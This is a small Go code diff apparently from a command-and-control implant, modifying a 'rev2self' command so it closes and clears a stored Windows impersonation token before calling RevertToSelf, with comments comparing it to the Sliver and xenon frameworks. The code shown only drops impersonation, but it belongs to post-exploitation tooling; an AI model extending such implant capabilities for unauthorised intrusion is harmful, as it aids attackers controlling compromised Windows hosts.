@@ -48,7 +48,15 @@ func (c *Rev2SelfCommand) Execute(task structs.Task) structs.CommandResult {
 		output += "Note: Not currently impersonating\n"
 	}
 
-	// Call RevertToSelf to drop impersonation (like Sliver)
+	// Close and clear the global token (like xenon's IdentityAgentRevertToken)
+	if gIdentityToken != 0 {
+		debugLog.WriteString("[DEBUG] Closing gIdentityToken...\n")
+		windows.CloseHandle(windows.Handle(gIdentityToken))
+		gIdentityToken = 0
+		debugLog.WriteString("[DEBUG] gIdentityToken closed and cleared\n")
+	}
+
+	// Call RevertToSelf to drop impersonation (like xenon)
 	debugLog.WriteString("[DEBUG] Calling RevertToSelf...\n")
 	ret, _, err := procRevertToSelf.Call()
 	if ret == 0 {
